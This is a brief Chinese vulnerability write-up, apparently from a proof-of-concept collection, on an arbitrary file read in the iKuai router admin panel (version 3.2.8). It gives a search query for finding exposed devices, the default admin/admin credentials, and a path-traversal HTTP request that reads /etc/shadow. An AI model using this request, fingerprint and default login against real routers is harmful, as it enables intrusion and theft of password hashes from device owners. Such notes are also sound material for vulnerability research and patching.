# iKuai 后台任意文件读取漏洞

## 漏洞描述

参考链接：

- https://forum.ywhack.com/thread-115307-1-8.html

## 漏洞影响

影响版本，不一定是绝对版本，也可能其它版本都存在：

```
3.2.8 x64 Build201910101758
```

## 网络测绘

```
title="登录爱快流控路由"
```

## 漏洞复现

默认用户名/密码：admin/admin

poc：

```
GET /Action/download?filename=../../../../../../etc/shadow HTTP/1.1
Host：
....
```





